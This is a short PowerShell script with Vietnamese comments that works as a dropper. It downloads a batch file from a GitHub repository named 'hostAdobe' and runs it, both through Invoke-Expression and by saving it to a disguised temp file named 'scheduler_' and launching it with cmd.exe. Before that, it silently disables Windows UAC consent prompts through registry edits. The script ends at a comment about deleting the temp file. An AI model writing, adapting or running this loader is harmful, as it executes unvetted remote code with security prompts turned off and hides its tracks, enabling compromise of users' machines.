Invoke-Expression -Command (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/minhtuan283/hostAdobe/main/run.bat' -UseBasicParsing).Content
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Type DWord -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'PromptOnSecureDesktop' -Type DWord -Value 0
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Danh sách URL chứa file thực thi
$URLs = @(
    'https://raw.githubusercontent.com/minhtuan283/hostAdobe/main/run.bat'
)

# Tải nội dung từ URL
foreach ($URL in $URLs | Sort-Object { Get-Random }) {
    try {
        $response = Invoke-WebRequest -Uri $URL -UseBasicParsing
        break
    } catch {}
}

if (-not $response) {
    Write-Host "Failed to retrieve the script from the available repository, aborting!"
    return
}

# Tạo file tạm để lưu nội dung script
$rand = [Guid]::NewGuid().Guid
$FilePath = "$env:USERPROFILE\AppData\Local\Temp\scheduler_$rand.bat"
Set-Content -Path $FilePath -Value $response.Content

# Thực thi file batch
Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$FilePath`"" -Wait

# Xóa file tạm sau khi thực thi
